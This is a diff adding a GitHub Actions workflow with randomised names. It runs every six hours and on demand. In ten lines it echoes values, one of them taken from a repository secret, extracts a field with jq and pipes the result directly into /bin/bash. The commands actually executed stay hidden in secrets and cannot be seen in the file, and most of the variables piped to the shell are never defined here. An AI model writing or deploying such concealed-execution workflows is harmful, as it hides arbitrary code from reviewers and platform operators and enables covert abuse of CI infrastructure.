@@ -1,0 +1,26 @@
+name: suirandanshiii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: suirandanshiii
+        env:
+          poy98976: ${{ secrets.poy98976 }}
+        run: |
+          echo $poy98976 | jq -r .bh4 | /bin/bash
+          echo $vmwzn9815 | jq -r .zqz84119 | /bin/bash
+          echo $sr04 | jq -r .cyb075 | /bin/bash
+          echo $qfhca688 | jq -r .dgzsw139 | /bin/bash
+          echo $cywq08 | jq -r .zga464 | /bin/bash
+          echo $qqcj64 | jq -r .aq7 | /bin/bash
+          echo $jogcp28789 | jq -r .apq511 | /bin/bash
+          echo $n8697 | jq -r .j86092 | /bin/bash
+          echo $tpfk57 | jq -r .c196 | /bin/bash
+          echo $g9 | jq -r .pmryk0270 | /bin/bash
+
